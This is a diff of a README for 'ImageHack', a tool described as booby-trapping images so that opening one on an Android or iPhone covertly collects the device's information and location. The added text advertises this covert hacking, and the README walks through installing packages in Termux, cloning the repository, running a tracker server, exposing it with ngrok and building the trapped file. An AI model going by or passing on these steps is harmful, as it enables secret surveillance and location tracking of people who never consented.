@@ -1,3 +1,7 @@
+# image mining tool for hacking phones.
+
+* This tool professionally mines images so that when the image is opened on the phone, the device is automatically hacked, and its information and location are collected without the user's knowledge. This powerful and intelligent tool works on Android and iPhone phones. 
+
 #### Tested On  :
 
 * Kali Linux
@@ -9,7 +13,8 @@
 * Termux ( Rooted/NonRooted Devices)
 
 
-✅ أولاً: تثبيت جميع الحزم المطلوبة
+✅ Install all required packages 
+
 ```
 pkg update && pkg upgrade
 ```
@@ -56,7 +61,7 @@ pkg install libpng -y
 pkg install libjpeg-turbo libpng freetype -y
 ```
 ---
-📲 تحميل الاداه
+📲 Download the tool 
 ```
 git clone https://github.com/black-demon-dr7/ImageHack.git
 ```
@@ -64,30 +69,30 @@ git clone https://github.com/black-demon-dr7/ImageHack.git
 ---
 
 
-📦 ثانياً: تثبيت المكاتب المطلوبة
+📦 Install the required offices 
 ```
 pip install -r requirements.txt
 ```
 
 ---
 
-💻 ثالثاً: تشغيل أداة الإختراق
+💻 Run the hacking tool 
 ```
 python tracker_server.py
 ```
 
 ---
 
-🌐 رابعاً: تشغيل ngrok
+🌐 Run ngrok 
 
-> تأكد من أنك قمت بتثبيت أداة ngrok وتسجيل الدخول بحسابك.
+> Make sure you have installed the ngrok tool and logged in with your account.
 
 
 
 
 ---
 
-🖼️ خامساً: فتح أداة تلغيم الصورة
+🖼️ Open image mining tool
 ```
 python make_pdf.py
 ```
